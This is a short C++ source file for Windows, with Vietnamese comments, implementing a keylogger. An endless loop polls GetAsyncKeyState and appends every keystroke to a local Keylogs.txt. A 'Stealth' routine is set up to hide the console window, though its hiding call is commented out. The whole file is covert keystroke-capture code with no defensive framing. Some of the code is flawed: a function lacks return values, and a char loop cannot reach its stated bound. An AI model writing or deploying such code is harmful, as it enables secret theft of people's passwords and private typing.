#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>



using namespace std;




//File luu data
void Data(string Text) 
{
	ofstream Log;
	Log.open("Keylogs.txt", fstream::app);
	Log << Text;
	Log.close();
}

//An khoi window 
void Stealth() 
{
	HWND hwnd;								//Dieukhien windows window
	AllocConsole();							//Cap quyen truy cap console 
	hwnd = FindWindowA("ConsoleWindowClass", NULL);
	//ShowWindow(hwnd, 0);						//Khong hien thi bang dieu khien
}


static bool isKey(int key)							//Cac phim dac biet
{
	switch (key) 
	{
	case VK_RETURN:
		Data("\n");
		break;
	case VK_BACK:
		Data("\b");
		break;
	case VK_SPACE:
		Data(" ");
		break;
	case VK_SHIFT:
		Data("Shift");
		break;
	case VK_OEM_PERIOD:
		Data(".");
		break;
	default: return false;
	}
}

int main() 
{
	Stealth(); 
	char Key;
	while (1) 
	{
		for (Key = 8; Key <= 255; Key++)	//chay het bang chu Ascii
		{
			if (GetAsyncKeyState(Key) == -32767)		//Ham GetAsyncKeyState de check xem co phai la mot key khong	
			{
				if (isKey(Key) == 0 )
				{
					ofstream Log;
					Log.open("Keylogs.txt", fstream::app);
					Log << Key;
					Log.close();
				
			
				}



			}

		}
		Sleep(50);                 //Tranh CPU cao
	}
}



